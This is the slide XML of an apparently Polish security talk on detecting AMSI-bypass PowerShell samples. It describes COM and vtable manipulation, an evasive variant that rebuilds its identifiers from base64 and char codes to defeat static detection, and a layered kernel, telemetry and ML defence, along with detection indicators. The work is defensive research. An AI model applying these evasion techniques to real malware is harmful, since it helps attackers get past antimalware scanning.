                  <a:srgbClr val="B6C1D1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ComManipulation: DllGetClassObject, GetDelegateForFunctionPointer, UnmanagedFunctionPointer. VtableManipulation: WriteIntPtr, ReadIntPtr, AllocHGlobal. Confidence 84, AMSI BYPASS. Defender by też pewnie złapał.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VI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57432" cy="640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Sample 27 - ewasywna wersja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496" y="1325880"/>
            <a:ext cx="7331959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623560"/>
            <a:ext cx="11457432" cy="10972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400">
                <a:solidFill>
                  <a:srgbClr val="B6C1D1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Robi DOKŁADNIE TO SAMO co 26, ale identyfikatory zrekonstruowane w runtime: method names z base64, 'AMSI' z char-codes 65/77/83/73, delegate attribute przez string concat. Zero literałów do match'owania.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VI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57432" cy="640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PUNCH MOMENT: Layer 1 mówi 'Clean'</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4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354" y="1325880"/>
            <a:ext cx="7230244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623560"/>
            <a:ext cx="11457432" cy="10972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400">
                <a:solidFill>
                  <a:srgbClr val="B6C1D1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Deobfuscator wykrył: nic. Confidence 0, zero indicators, is_amsi_bypass: false. Statyczna analiza nie potrafi rozszyfrować że [int][char]$k[0] -eq 65 to porównanie ze znakiem 'A'. Fundamentalny limit bez symbolic execution.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VI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57432" cy="640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Layer 2 łapie sample 27 - block w konsoli ofiary</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4" descr="8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3118"/>
            <a:ext cx="11457432" cy="29060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623560"/>
            <a:ext cx="11457432" cy="10972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400">
                <a:solidFill>
                  <a:srgbClr val="B6C1D1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Kernel widzi że proces enumeruje rejestr AMSI providers. sysmon-um: NtSuspendProcess → ocena (.ps1 z user-path = SUSPECT) → wstrzykuje czerwony tekst do konsoli ofiary → TerminateProcess. Wygląda jak natywny AMSI block.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VI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57432" cy="6400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Layer 2 - pełen audit trail w sysmon-um</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4" descr="8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58725"/>
            <a:ext cx="11457432" cy="32948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623560"/>
            <a:ext cx="11457432" cy="10972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400">
                <a:solidFill>
                  <a:srgbClr val="B6C1D1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ProcessCreate → AMSI-RECON (registry read na \AMSI\Providers) → SUSPENDED (NtSuspendProcess) → VERDICT: SUSPECT → TERMINATED. Niezależny kernel-level observer odporny na user-mode bypass (AMSI/ETW disabled by attacker).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Podsumowanie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3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73152" cy="8229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AMSI to niezbędna warstwa...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39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AABBCC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>...ale nie jedyna. Bez dodatkowych warstw daje się ominąć.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514600"/>
            <a:ext cx="73152" cy="8229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Obfuscacja jest łatwa...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AABBCC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>...ale detekowalna przy poprawnym podejściu statycznym + ML.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749039"/>
            <a:ext cx="73152" cy="8229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749039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Obrona musi być wielowarstwowa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AABBCC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Static → Behavioral → Telemetry → Hybrid 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983480"/>
            <a:ext cx="73152" cy="8229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98348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Hybrid ML = przyszłość detekcji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94960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AABBCC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Rule + ML = lepsze wyniki bez black-box gotchas.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Q&amp;A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8288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400" b="1">
                <a:solidFill>
                  <a:srgbClr val="3EA1FC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>V · Wykrywanie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455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2800" b="1">
                <a:solidFill>
                  <a:srgbClr val="E8EEF7"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Layer 1 — Online ML (early stage)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74552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600" b="0">
                <a:solidFill>
                  <a:srgbClr val="7A8699"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Heuristic rules teach the ML. ML weight grows with sample count.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30352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800" b="1">
                <a:solidFill>
                  <a:srgbClr val="3EA1FC"/>
                </a:solidFill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303520" cy="4114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300" b="0">
                <a:solidFill>
                  <a:srgbClr val="C8D1DD"/>
                </a:solidFill>
              </a:rPr>
              <a:t>1.  Each scan extracts 20-feature vector</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="C8D1DD"/>
                </a:solidFill>
              </a:rPr>
              <a:t>    (entropy, base64 density, reflection APIs,</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="C8D1DD"/>
                </a:solidFill>
              </a:rPr>
              <a:t>    memory APIs, line stats, ...)</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="C8D1DD"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2.  Logistic regression scores 0.0 – 1.0</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="C8D1DD"/>
                </a:solidFill>
              </a:rPr>
              <a:t>    using current model coefficients.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="C8D1DD"/>
                </a:solidFill>
              </a:rPr>
              <a:t>3.  Sample counter (persisted on disk) tracks</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="C8D1DD"/>
                </a:solidFill>
              </a:rPr>
              <a:t>    total scans accumulated.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="C8D1DD"/>
                </a:solidFill>
              </a:rPr>
              <a:t>4.  Blending:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="C8D1DD"/>
                </a:solidFill>
              </a:rPr>
              <a:t>    weight    = min(samples / 10 000, 1.0)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="C8D1DD"/>
                </a:solidFill>
              </a:rPr>
              <a:t>    confidence = rules · (1 – w) + ml · w</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="C8D1DD"/>
                </a:solidFill>
              </a:rPr>
              <a:t>5.  Heuristic label saved with features</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="C8D1DD"/>
                </a:solidFill>
              </a:rPr>
              <a:t>    → future re-training on real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828800"/>
            <a:ext cx="5605272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800" b="1">
                <a:solidFill>
                  <a:srgbClr val="3EA1FC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Example output (sample 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286000"/>
            <a:ext cx="5605272" cy="4114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200" b="0">
                <a:solidFill>
                  <a:srgbClr val="4ED69A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>"ml": {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1200" b="0">
                <a:solidFill>
                  <a:srgbClr val="4ED69A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  "score":         0.99,</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1200" b="0">
                <a:solidFill>
                  <a:srgbClr val="4ED69A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  "weight":        0.008,    ← 79 / 10 000</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1200" b="0">
                <a:solidFill>
                  <a:srgbClr val="4ED69A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  "sample_count":  79,</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1200" b="0">
                <a:solidFill>
                  <a:srgbClr val="4ED69A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  "interpretation":</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1200" b="0">
                <a:solidFill>
                  <a:srgbClr val="4ED69A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>    "early-stage model agrees with</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1200" b="0">
                <a:solidFill>
                  <a:srgbClr val="4ED69A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>     rules but weight is only 0.8%",</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1200" b="0">
                <a:solidFill>
                  <a:srgbClr val="4ED69A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  "top_features": [</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1200" b="0">
                <a:solidFill>
                  <a:srgbClr val="4ED69A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>    { amsi_string_count : +3.2 },</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1200" b="0">
                <a:solidFill>
                  <a:srgbClr val="4ED69A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>    { entropy           : +1.9 },</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1200" b="0">
                <a:solidFill>
                  <a:srgbClr val="4ED69A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>    { base64_count      : +1.4 },</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1200" b="0">
                <a:solidFill>
                  <a:srgbClr val="4ED69A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>    { reflection_api    : +0.9 }</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1200" b="0">
                <a:solidFill>
                  <a:srgbClr val="4ED69A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  ]</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1200" b="0">
                <a:solidFill>
                  <a:srgbClr val="4ED69A"/>
                </a:solidFill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4552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400" b="1">
                <a:solidFill>
                  <a:srgbClr val="F5C84C"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Confidence ramp:    1 sample → 0.01 %    ·    100 → 1 %    ·    1 000 → 10 %    ·    10 000 → 100 %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4552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200" b="0">
                <a:solidFill>
                  <a:srgbClr val="7A8699"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Honest demo state: rules carry &gt; 99 % of verdict today. ML observes and learns. Architecture supports future-proof retraining; weight grows automatically as data accrues.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